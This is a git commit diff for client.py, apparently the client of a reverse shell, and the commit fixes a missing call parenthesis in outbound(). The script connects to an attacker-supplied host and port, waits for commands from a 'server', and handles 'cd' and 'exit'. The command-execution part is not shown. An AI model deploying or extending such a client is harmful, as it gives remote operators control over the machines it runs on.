3d3824d6b079c7ef4e7f15799c10d222d883428b
trejwil <107530425+trejwil@users.noreply.github.com>
2023-08-31 17:45:59 -0500

    missing paretheses in outbound()

--- client.py
+++ client.py
@@ -6,6 +6,7 @@ import sys
 def inbound():
     print("[+] Awaiting response...")
     message = " "
+
     while True:
         try:
             message = sock.recv(1024).decode()
@@ -15,20 +16,23 @@ def inbound():
             sock.close()
 
 def outbound(message):
-    response = str(message).encode
+    response = (message).encode()
     sock.send(response)
 
 def session_handler():
     print(f"[+] Connecting to {host_ip}.")
     sock.connect((host_ip, host_port))
     print(f"[+] Connected to {host_ip}.")
+
     while True:
         message = inbound()
         print(f"[+] Message received - {message}")
+
         if message == "exit":
             print("[-] The server has terminated the session.")
             sock.close()
             break
+
         elif message.split(" ")[0] == "cd":
             try:
                 directory = str(message.split(" ")[1])
@@ -47,10 +51,12 @@ def session_handler():
 
 if __name__ == "__main__":
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
     try:
         host_ip = sys.argv[1]
         host_port = int(sys.argv[2])
         session_handler()
+
     except IndexError:
         print("[!] Command line argument(s) missing.")
     
